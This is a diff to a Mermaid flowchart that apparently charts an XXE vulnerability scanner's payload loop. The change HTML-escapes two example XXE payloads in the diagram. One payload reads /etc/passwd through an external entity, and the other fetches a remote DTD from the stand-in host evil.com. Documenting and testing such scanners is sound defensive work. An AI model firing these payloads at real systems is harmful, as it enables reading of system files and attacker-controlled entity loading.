@@ -41,11 +41,10 @@ graph TD
     logVuln --> loopPayloads
     loopPayloads -->|done| collectResults
     collectResults --> endScan
-    
-    %% XXE Payloads
+      %% XXE Payloads
     subgraph "XXE Payload Examples"
-        payload1["<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>"]
-        payload2["<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]>"]
+        payload1["&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;"]
+        payload2["&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://evil.com/evil.dtd&quot;&gt;%xxe;]&gt;"]
     end
     
     %% Vulnerability detection
